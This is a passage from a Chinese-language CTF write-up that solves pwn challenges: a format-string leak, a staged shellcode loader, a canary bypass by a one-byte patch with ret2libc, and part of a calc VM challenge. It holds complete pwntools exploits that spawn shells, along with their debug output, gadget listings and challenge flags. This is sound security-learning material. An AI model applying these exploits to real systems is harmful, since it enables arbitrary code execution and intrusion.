            printf(format: input);
            putchar(c: 10);
          }
        }
      }
    }
    else
    {
      fwrite(ptr: &ptr__0, size: 1u, n: 0xCu, s: stderr);
    }
  }
  else
  {
    fwrite(ptr: &ptr__1, size: 1u, n: 0xFu, s: stderr);
  }
}
```

注意这里 `printf(format: input)` 存在明显的格式化字符串漏洞。

栈上的变量 `flag_cache` 应该就是我们的目标，所以我们只需要不停地试向后找偏移直到找到 flag 为止。

经过尝试发现 flag 位于 vargs 偏移 48 处：

```bash
输入> %48$lx.%49$lx.%50$lx.%51$lx.%52$lx.%53$lx.%54$lx.%55$lx.%56$lx.%57$lx.%58$lx.%59$lx.%60$lx.%61$lx.%62$lx.%63$lx
3766637b67616c66.61612d3135336161.2d616438312d6337.6563382d36633063.3935313430393766.7d66.0.0.3766637b67616c66.61612d3135336161.2d616438312d6337.6563382d36633063.3935313430393766.7d66.0.0
```

0x66 对应 f，小端序来看这就是 flag 的开头。

简单提取一下：

```py
leaks = [
    0x3766637b67616c66,
    0x61612d3135336161,
    0x2d616438312d6337,
    0x6563382d36633063,
    0x3935313430393766,
    0x7d66,
]

flag = b""

for val in leaks:
    chunk = val.to_bytes(8, byteorder="little")
    flag += chunk

flag = flag.rstrip(b"\x00")

print("FLAG:", flag.decode())
```

输出如下：

```txt
> python decode.py
FLAG: flag{cf7aa351-aa7c-18da-c0c6-8cef7904159f}
```

```txt
flag{cf7aa351-aa7c-18da-c0c6-8cef7904159f}
```

### Shellcode;Gate

![](https://img.halfcity.top/2026/11/10/d525e4c36fb004175aa82e535d157eda.png)

![](https://img.halfcity.top/2026/11/10/3695473030fb419e555564da25ef976f.png)

这里先申请了一页 RWX 的内存，随后向 buf 中读取了 15 字节的数据并进入 `clean_and_jump()`，这个函数。

在这个函数中 buf 的前八个字节被自己的地址填充，随后这里跳过了前八个字节并绕了一圈将跳过八个字节后的地址 push 并将除了放置 buf 地址的 r15 寄存器全部清空人然后 ret 到后面的 shellcode。

我们有 7 个字节的空间可以使用，同时在 r15 还有 buf 自己的地址。

此时我们的状态是：

- rax：0  
- rdi：0
- rsi：0
- rdx：0

距离 read 的 syscall 只差 rdi 和 rdx，7 字节的空间刚好足够补全参数并 syscall。

随后读取 stage2 补全到 stage1 后面即可。

exp 如下：

```py
from pwn import *

exe = ELF("./pwn")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 36879)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    io.recvuntil(b"Submit your shellcode:\n")

    stage1 = b'A' * 8 + asm('''
        mov rsi, r15        # rsi = buf
        mov dh, 0x10        # rdx = 0x1000
        syscall             # read(0, buf, 0x1000)
    ''')
    send(stage1)

    shellcode = asm('''
        xor esi, esi        # argv = NULL
        xor edx, edx        # envp = NULL
        push 59             # sys_execve
        pop rax
        mov rdi, r15        # rdi = buf
        syscall
    ''')
    stage2 = b'/bin/sh\x00' + b'B' * 7 + shellcode
    send(stage2)

    interactive()


if __name__ == "__main__":
    main()
```

输出如下：

```py
❯ python exp.py
[*] '/home/halfcity/Desktop/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 110.42.112.160 on port 36879: Done
[DEBUG] Received 0x3d bytes:
    b'Only chosen bytes may cross the gate.\n'
    b'Submit your shellcode:\n'
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
            mov rsi, r15 # rsi = buf
            mov dh, 0x10 # rdx = 0x1000
            syscall # read(0, buf, 0x1000)
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/6d1550961e53f0ff6751a703cddf255b4ed8b56d'
[*] sending payload: b'AAAAAAAAL\x89\xfe\xb6\x10\x0f\x05'
[DEBUG] Sent 0xf bytes:
    00000000  41 41 41 41  41 41 41 41  4c 89 fe b6  10 0f 05     │AAAA│AAAA│L···│···│
    0000000f
[+] payload sent
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
            xor esi, esi # argv = NULL
            xor edx, edx # envp = NULL
            push 59 # sys_execve
            pop rax
            mov rdi, r15 # rdi = buf\U0000ff0c\U00006307\U00005411 "/bin/sh"
            syscall
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/cc35488d3af9f47f4e8d9ad0c76046e653842669'
[*] sending payload: b'/bin/sh\x00BBBBBBB1\xf61\xd2j;XL\x89\xff\x0f\x05'
[DEBUG] Sent 0x1b bytes:
    00000000  2f 62 69 6e  2f 73 68 00  42 42 42 42  42 42 42 31  │/bin│/sh·│BBBB│BBB1│
    00000010  f6 31 d2 6a  3b 58 4c 89  ff 0f 05                  │·1·j│;XL·│···│
    0000001b
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2d bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libs\n'
    b'pwn\n'
    b'secret\n'
bin
dev
flag
lib
lib32
lib64
libs
pwn
secret
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2a bytes:
    b'flag{ce723cb4-0bd8-8556-1621-d61055a47ca0}'
flag{ce723cb4-0bd8-8556-1621-d61055a47ca0}
```

```txt
flag{ce723cb4-0bd8-8556-1621-d61055a47ca0}
```

### 宇宙射线·一

这个题目比较特殊它允许我们修改服务端进程指定偏移处一字节的内容。

我们先看题目：

![](https://img.halfcity.top/2026/11/10/07e64e8217d1e74aa890fecf7a1e4b04.png)

```c
read(fd: 0, buf: buf, nbytes: 240u);
```

这一行有明显的溢出，但是我们没有办法泄露 canary。

我们看看汇编：

```asm
.text:00000000000011BD                    ; Attributes: bp-based frame
.text:00000000000011BD
.text:00000000000011BD                    ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:00000000000011BD                                    public main
.text:00000000000011BD                    main            proc near               ; DATA XREF: _start+18↑o
.text:00000000000011BD
.text:00000000000011BD                    buf             = byte ptr -60h
.text:00000000000011BD                    var_8           = qword ptr -8
.text:00000000000011BD
.text:00000000000011BD                    ; __unwind {
.text:00000000000011BD 000 F3 0F 1E FA                    endbr64
.text:00000000000011C1 000 55                             push    rbp
.text:00000000000011C2 008 48 89 E5                       mov     rbp, rsp
.text:00000000000011C5 008 48 83 EC 60                    sub     rsp, 60h
.text:00000000000011C9 068 64 48 8B 04 25                 mov     rax, fs:28h
.text:00000000000011C9 068 28 00 00 00
.text:00000000000011D2 068 48 89 45 F8                    mov     [rbp+var_8], rax
.text:00000000000011D6 068 31 C0                          xor     eax, eax
.text:00000000000011D8 068 48 8D 05 41 0E                 lea     rax, msg_0      ; "Haha, you can never bypass canary!"
.text:00000000000011D8 068 00 00
.text:00000000000011DF 068 48 89 C7                       mov     rdi, rax        ; s
.text:00000000000011E2 068 E8 89 FE FF FF                 call    _puts
.text:00000000000011E7 068 48 8D 45 A0                    lea     rax, [rbp+buf]
.text:00000000000011EB 068 BA F0 00 00 00                 mov     edx, 0F0h       ; nbytes
.text:00000000000011F0 068 48 89 C6                       mov     rsi, rax        ; buf
.text:00000000000011F3 068 BF 00 00 00 00                 mov     edi, 0          ; fd
.text:00000000000011F8 068 E8 93 FE FF FF                 call    _read
.text:00000000000011FD 068 B8 00 00 00 00                 mov     eax, 0
.text:0000000000001202 068 48 8B 55 F8                    mov     rdx, [rbp+var_8]
.text:0000000000001206 068 64 48 2B 14 25                 sub     rdx, fs:28h
.text:0000000000001206 068 28 00 00 00
.text:000000000000120F 068 74 05                          jz      short locret_1216
.text:0000000000001211 068 E8 6A FE FF FF                 call    ___stack_chk_fail
.text:0000000000001216                    ; ---------------------------------------------------------------------------
.text:0000000000001216
.text:0000000000001216                    locret_1216:                            ; CODE XREF: main+52↑j
.text:0000000000001216 068 C9                             leave
.text:0000000000001217 000 C3                             retn
.text:0000000000001217                    ; } // starts at 11BD
.text:0000000000001217                    main            endp
```

```asm
.text:000000000000120F 068 74 05                          jz      short locret_1216
```

这里的 jz 对应 0x74 ，根据上下文这是决定 canary 匹配错误是否跳转的关键指令。

现在的逻辑是如果匹配则跳转 ret。

我们只需要将 jz 修改为 jnz 也就是将程序基址偏移 0x120F 处的一个字节从 0x74 改为 0x75 即可。

随后附件中给出了 libc 文件，那么相比这题就是 ret2libc了。

我们可以先手动 patch 在本地测试一下：

![](https://img.halfcity.top/2026/11/10/daddcc78725c28edd21fc08f3a097b3b.png)

先手动解析基址，然后利用 libc 中的 gadget 完成 ret2system 的 ROP 链。

exp 如下：

```py
#!/usr/bin/env python3
import os
from pwn import *

exe  = ELF("./pwn_patched")
HERE = os.path.dirname(os.path.abspath(__file__))
libc = ELF(os.path.join(HERE, 'libc.so.6'), checksec=False)

context.binary  = exe
context.arch    = "amd64"
context.log_level = "debug"
context.gdb_binary = "pwndbg"

PATCH_OFF = 0x120F

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, """
                set follow-fork-mode parent
                b *0x120F
                c
            """)
    else:
        r = remote("addr", 1337)
    return r


def get_libc_base(pid):
    addrs = []
    with open(f"/proc/{pid}/maps", "r") as f:
        for line in f:
            if 'libc.so.6' in line:
                start = int(line.split('-', 1)[0], 16)
                addrs.append(start)
    if not addrs:
        raise RuntimeError("libc not found in maps")
    return min(addrs)


def main():
    io = conn()

    io.recvline_contains(b"canary")
    libc_base = get_libc_base(io.pid)
    log.success("libc base = %#x", libc_base)
    
    leak = io.pid and open(f"/proc/{io.pid}/mem", "rb", 0)
    try:
        leak.seek(libc_base)
        magic = leak.read(4)
        log.info("libc[base:base+4] = %s", magic)
        assert magic == b"\x7fELF", "libc base looks wrong!"
    except Exception as e:
        log.warning("mem check skipped: %s", e)
    
    pop_rdi = libc_base + next(libc.search(asm("pop rdi; ret")))
    ret     = pop_rdi + 1
    bin_sh  = libc_base + next(libc.search(b"/bin/sh\x00"))
    system  = libc_base + libc.symbols["system"]
    
    log.info('pop_rdi=%#x ret=%#x /bin/sh=%#x system=%#x',
             pop_rdi, ret, bin_sh, system)
    
    payload  = b"A" * 88
    payload += b"B" * 8
    payload += b"C" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)
    
    io.send(payload)
    
    io.interactive()


if __name__ == "__main__":
    main()
```

经测试，exp 正常运行。

接下来我们将 payload 构造的部分填入题目给的模版：

```py
#!/usr/bin/env python3
# cosmic-ray 解题模板
# 用法: python3 solve.py [remote|local] [host] [port]
import os
import re
import sys
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
context.timeout = 15

HERE = os.path.dirname(os.path.abspath(__file__))

MODE = sys.argv[1] if len(sys.argv) > 1 else 'local'
HOST = sys.argv[2] if len(sys.argv) > 2 else '110.42.112.160'
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 45755

# 每轮: (patch 文件偏移, 单字节, 自定义类型)
ROUNDS = [
    (0x120F, 0x75, 'bypass_canary')
]

libc = ELF(os.path.join(HERE, 'libc.so.6'), checksec=False)

def build_payload(kind, libc_base):
    pop_rdi = libc_base + next(libc.search(asm("pop rdi; ret")))
    ret     = pop_rdi + 1
    bin_sh  = libc_base + next(libc.search(b"/bin/sh\x00"))
    system  = libc_base + libc.symbols["system"]

    log.info('pop_rdi=%#x ret=%#x /bin/sh=%#x system=%#x', pop_rdi, ret, bin_sh, system)
    
    payload = b"A" * 88
    payload += b"B" * 8
    payload += b"C" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)
    
    payload = payload.ljust(240, b"\x90")
    
    payload += b'cat flag\n'
    
    return payload


def start():
    if MODE == 'remote':
        return remote(HOST, PORT)
    env = dict(os.environ)
    env['ROUND'] = str(1)
    env['BLOCK_LIMIT'] = str(0)
    return process(['python3', 'chal.py'], cwd=HERE, env=env)


def main():
    p = start()

    for idx, (off, byte, kind) in enumerate(ROUNDS, 1):
        p.recvuntil(b'location (hex file offset): ')
        p.sendline(hex(off).encode())
    
        p.recvuntil(b'machine code (hex byte): ')
        p.sendline(hex(byte).encode())
    
        data = p.recvuntil(b'Enter exp (hex): ')
        libc_base = None
        for line in data.split(b'\n'):
            if b'libc.so.6' in line:
                libc_base = int(line.split(b'-')[0], 16)
                break
        assert libc_base is not None, 'libc base not found'
        log.success('[%d/%d] patch %#x -> %#x  (%s)  libc=%#x'
                    % (idx, len(ROUNDS), off, byte, kind, libc_base))
    
        p.sendline(build_payload(kind, libc_base).hex().encode())
    
    out = p.recvall(timeout=10)
    m = re.search(rb'flag\{[^}]*\}', out)
    if m and b'Well Done' in out:
        log.success('flag = %s' % m.group().decode())
    else:
        log.failure('failed')
        print(out.decode(errors='replace')[-300:])


main()
```

输出如下：

```bash
❯ python solve.py remote
[+] Opening connection to 110.42.112.160 on port 45755: Done
[DEBUG] Received 0x2e bytes:
    b'[1/1] Enter patch location (hex file offset): '
[DEBUG] Sent 0x7 bytes:
    b'0x120f\n'
[DEBUG] Received 0x2b bytes:
    b'[1/1] Enter patch machine code (hex byte): '
[DEBUG] Sent 0x5 bytes:
    b'0x75\n'
[DEBUG] Received 0x84a bytes:
    b'562c21cec000-562c21ced000 r--p 00000000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21ced000-562c21cee000 r-xp 00001000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21cee000-562c21cef000 r--p 00002000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21cef000-562c21cf0000 r--p 00002000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c21cf0000-562c21cf1000 rw-p 00003000 00:58a 4589256                   /home/ctf/pwn_patched_0\n'
    b'562c33491000-562c334b2000 rw-p 00000000 00:00 0                          [heap]\n'
    b'7f2bb52f2000-7f2bb52f5000 rw-p 00000000 00:00 0 \n'
    b'7f2bb52f5000-7f2bb531d000 r--p 00000000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb531d000-7f2bb54a6000 r-xp 00028000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54a6000-7f2bb54f5000 r--p 001b1000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54f5000-7f2bb54f9000 r--p 001ff000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54f9000-7f2bb54fb000 rw-p 00203000 00:58a 3952640                   /usr/lib/x86_64-linux-gnu/libc.so.6\n'
    b'7f2bb54fb000-7f2bb5508000 rw-p 00000000 00:00 0 \n'
    b'7f2bb550b000-7f2bb550d000 rw-p 00000000 00:00 0 \n'
    b'7f2bb550d000-7f2bb5511000 r--p 00000000 00:00 0                          [vvar]\n'
    b'7f2bb5511000-7f2bb5513000 r-xp 00000000 00:00 0                          [vdso]\n'
    b'7f2bb5513000-7f2bb5514000 r--p 00000000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb5514000-7f2bb553f000 r-xp 00001000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb553f000-7f2bb5549000 r--p 0002c000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb5549000-7f2bb554b000 r--p 00036000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7f2bb554b000-7f2bb554d000 rw-p 00038000 00:58a 3952620                   /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n'
    b'7ffe49997000-7ffe499b8000 rw-p 00000000 00:00 0                          [stack]\n'
    b'\n'
    b'[1/1] Enter exp (hex): '
[+] [1/1] patch 0x120f -> 0x75  (bypass_canary)  libc=0x7f2bb52f5000
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    pop rdi; ret
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/43199008abdbe03d62af31e73430145d50b6d333'
[*] pop_rdi=0x7f2bb540108d ret=0x7f2bb540108e /bin/sh=0x7f2bb54c142f system=0x7f2bb534d750
[DEBUG] Sent 0x1f3 bytes:
    b'41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141424242424242424243434343434343438e1040b52b7f00008d1040b52b7f00002f144cb52b7f000050d734b52b7f0000909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909063617420666c61670a\n'
[+] Receiving all data: Done (60B)
[DEBUG] Received 0x3c bytes:
    b'Well Done.\n'
    b"b'flag{0ne_byTe-can_m@Ke_4_dIFFerEnce-45ce1b}\\n'\n"
[*] Closed connection to 110.42.112.160 port 45755
[+] flag = flag{0ne_byTe-can_m@Ke_4_dIFFerEnce-45ce1b}
```

```txt
flag{0ne_byTe-can_m@Ke_4_dIFFerEnce-45ce1b}
```

### calc...不对，这不是2025年

简单修复一下指针类型并重命名，随后分析。

![](https://img.halfcity.top/2026/11/10/c12e6493353ef213e26f06e11f29806f.png)

给人的感觉像是一个 vm？不过这是一个 pwn 题。

read_decimal 确保读取到一个十进制数字。

传入到每一个 handler 的 slots 参数都是指针，slots 来自上一个栈帧。

![](https://img.halfcity.top/2026/11/10/357577e6576523d77a20e8dbc2cd5caa.png)

由于没有对下标进行限制，通过下标，edit 功能可以越界直接对本函数的栈帧进行改写。

execve 需要三个参数，根据 ABI，他们分别需要在 rdi rsi rdx。

让我们找找有没有可以用的 gadget：

```bash
❯ ROPgadget --binary calc
Gadgets information
============================================================
0x00000000004010e8 : adc byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401155 ; nop ; ret
0x000000000040143f : adc byte ptr [rax + 1], bh ; leave ; ret
0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040155c : add al, 0x90 ; jmp 0x401561
0x000000000040163a : add al, 0x90 ; jmp 0x40163f
0x0000000000401718 : add al, 0x90 ; jmp 0x40171d
0x00000000004017f7 : add al, 0x90 ; jmp 0x4017fc
0x0000000000401771 : add al, bpl ; jmp 0xffffffff8a401775
0x0000000000401597 : add al, bpl ; ret
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401772 : add al, ch ; jmp 0xffffffff8a401775
0x0000000000401598 : add al, ch ; ret
0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret
0x0000000000401298 : add bh, byte ptr [rax + 1] ; leave ; ret
0x000000000040119e : add byte ptr [rax - 0x77], cl ; ret 0x40be
0x000000000040116c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; jmp 0x401100
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401279 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40129e
0x000000000040142f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401445
0x0000000000401498 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014cd
0x000000000040180d : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401842
0x000000000040185b : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401880
0x00000000004010b8 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x0000000000401a4d : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040129b : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040134d : add byte ptr [rax], al ; add qword ptr [rbp - 8], 2 ; jmp 0x4013da
0x000000000040116e : add byte ptr [rax], al ; endbr64 ; jmp 0x401100
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x000000000040127b : add byte ptr [rax], al ; jmp 0x40129e
0x0000000000401431 : add byte ptr [rax], al ; jmp 0x401445
0x000000000040149a : add byte ptr [rax], al ; jmp 0x4014cd
0x000000000040180f : add byte ptr [rax], al ; jmp 0x401842
0x000000000040185d : add byte ptr [rax], al ; jmp 0x401880
0x000000000040129c : add byte ptr [rax], al ; leave ; ret
0x00000000004010ba : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x0000000000401a4f : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x0000000000401084 : add byte ptr [rax], al ; push 5 ; jmp 0x401020
0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x0000000000401275 : add byte ptr [rbp + 7], dh ; mov eax, 0 ; jmp 0x40129e
0x000000000040142b : add byte ptr [rbp + 7], dh ; mov eax, 0 ; jmp 0x401445
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040129d : add cl, cl ; ret
0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret
0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040129a : add dword ptr [rax], eax ; add byte ptr [rax], al ; leave ; ret
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040120e : add dword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401350 : add dword ptr [rbp - 8], 2 ; jmp 0x4013da
0x0000000000401841 : add dword ptr [rbx + 0x7e07fc7d], eax ; retf
0x00000000004014c7 : add eax, 0x1b8 ; add cl, cl ; ret
0x0000000000401157 : add eax, 0x2edb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401013 : add esp, 8 ; ret
0x000000000040120d : add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x000000000040134f : add qword ptr [rbp - 8], 2 ; jmp 0x4013da
0x0000000000401012 : add rsp, 8 ; ret
0x000000000040188f : call qword ptr [rax + 0x4855c3c9]
0x0000000000401010 : call rax
0x000000000040180c : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401842
0x000000000040185a : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401880
0x0000000000401840 : cld ; add dword ptr [rbx + 0x7e07fc7d], eax ; retf
0x0000000000401173 : cli ; jmp 0x401100
0x000000000040121b : cmp al, 0x2b ; jne 0x40125c ; add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401842 : cmp dword ptr [rbp - 4], 7 ; jle 0x401813 ; nop ; nop ; leave ; ret
0x0000000000401170 : endbr64 ; jmp 0x401100
0x0000000000401158 : fld xword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040188d : idiv edi ; call qword ptr [rax + 0x4855c3c9]
0x000000000040142a : in al, dx ; add byte ptr [rbp + 7], dh ; mov eax, 0 ; jmp 0x401445
0x00000000004011fa : iretd
0x0000000000401062 : jb 0x401093 ; add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x000000000040100e : je 0x401012 ; call rax
0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404010 ; jmp rax
0x0000000000401127 : je 0x401130 ; mov edi, 0x404010 ; jmp rax
0x0000000000401808 : jge 0x4017f2 ; mov dword ptr [rbp - 4], 0 ; jmp 0x401842
0x0000000000401856 : jge 0x401840 ; mov dword ptr [rbp - 4], 0 ; jmp 0x401880
0x000000000040176f : jl 0x401791 ; add al, bpl ; jmp 0xffffffff8a401775
0x0000000000401846 : jle 0x401813 ; nop ; nop ; leave ; ret
0x000000000040103b : jmp 0x401020
0x0000000000401174 : jmp 0x401100
0x00000000004011c8 : jmp 0x4011cf
0x0000000000401212 : jmp 0x40125c
0x000000000040128c : jmp 0x401292
0x000000000040127d : jmp 0x40129e
0x00000000004012eb : jmp 0x4012f2
0x000000000040137f : jmp 0x4013b9
0x0000000000401354 : jmp 0x4013da
0x0000000000401433 : jmp 0x401445
0x000000000040149c : jmp 0x4014cd
0x000000000040155b : jmp 0x401561
0x0000000000401636 : jmp 0x40163f
0x0000000000401714 : jmp 0x40171d
0x00000000004017f3 : jmp 0x4017fc
0x0000000000401811 : jmp 0x401842
0x000000000040185f : jmp 0x401880
0x0000000000401947 : jmp 0x4018b9
0x00000000004019f3 : jmp 0x401a05
0x0000000000401774 : jmp 0xffffffff8a401775
0x00000000004010ec : jmp rax
0x00000000004011b4 : jne 0x4011c0 ; mov eax, 0 ; jmp 0x40129e
0x000000000040121d : jne 0x40125c ; add qword ptr [rbp - 8], 1 ; jmp 0x40125c
0x0000000000401276 : jne 0x40127f ; mov eax, 0 ; jmp 0x40129e
0x00000000004012d7 : jne 0x4012e3 ; mov eax, 0 ; jmp 0x401445
0x000000000040142c : jne 0x401435 ; mov eax, 0 ; jmp 0x401445
0x0000000000401495 : jne 0x40149e ; mov eax, 0 ; jmp 0x4014cd
0x0000000000401283 : jns 0x40128e ; mov rax, qword ptr [rbp - 0x10] ; neg rax ; jmp 0x401292
0x0000000000401052 : jp 0x401083 ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x000000000040129e : leave ; ret
0x00000000004010ed : loopne 0x401155 ; nop ; ret
0x0000000000401156 : mov byte ptr [rip + 0x2edb], 1 ; pop rbp ; ret
0x0000000000401032 : mov ch, byte ptr [rdi] ; add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x000000000040143e : mov dword ptr [rax], edx ; mov eax, 1 ; leave ; ret
0x000000000040137c : mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040180a : mov dword ptr [rbp - 4], 0 ; jmp 0x401842
0x0000000000401858 : mov dword ptr [rbp - 4], 0 ; jmp 0x401880
0x00000000004011c1 : mov dword ptr [rbp - 8], 0x404040 ; jmp 0x4011cf
0x00000000004012e4 : mov dword ptr [rbp - 8], 0x404040 ; jmp 0x4012f2
0x0000000000401297 : mov dword ptr [rdx], eax ; mov eax, 1 ; leave ; ret
0x0000000000401278 : mov eax, 0 ; jmp 0x40129e
0x000000000040142e : mov eax, 0 ; jmp 0x401445
0x0000000000401497 : mov eax, 0 ; jmp 0x4014cd
0x0000000000401a4c : mov eax, 0 ; pop rbp ; ret
0x00000000004014c1 : mov eax, 0xffffffff ; jmp 0x4014cd
0x0000000000401299 : mov eax, 1 ; leave ; ret
0x000000000040134b : mov eax, dword ptr [rax] ; add byte ptr [rax], al ; add qword ptr [rbp - 8], 2 ; jmp 0x4013da
0x0000000000401286 : mov eax, dword ptr [rbp - 0x10] ; neg rax ; jmp 0x401292
0x00000000004010e7 : mov edi, 0x404010 ; jmp rax
0x0000000000401377 : mov esi, 0x30e883c0 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040139f : mov esi, 0x57e883c0 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040143d : mov qword ptr [rax], rdx ; mov eax, 1 ; leave ; ret
0x00000000004011c0 : mov qword ptr [rbp - 8], 0x404040 ; jmp 0x4011cf
0x00000000004012e3 : mov qword ptr [rbp - 8], 0x404040 ; jmp 0x4012f2
0x0000000000401296 : mov qword ptr [rdx], rax ; mov eax, 1 ; leave ; ret
0x0000000000401285 : mov rax, qword ptr [rbp - 0x10] ; neg rax ; jmp 0x401292
0x0000000000401376 : movsx eax, al ; sub eax, 0x30 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040139e : movsx eax, al ; sub eax, 0x57 ; mov dword ptr [rbp - 0x18], eax ; jmp 0x4013b9
0x000000000040128a : neg eax ; jmp 0x401292
0x0000000000401289 : neg rax ; jmp 0x401292
0x000000000040155d : nop ; jmp 0x401561
0x0000000000401638 : nop ; jmp 0x40163f
0x0000000000401716 : nop ; jmp 0x40171d
0x00000000004017f5 : nop ; jmp 0x4017fc
0x0000000000401560 : nop ; leave ; ret
0x0000000000401848 : nop ; nop ; leave ; ret
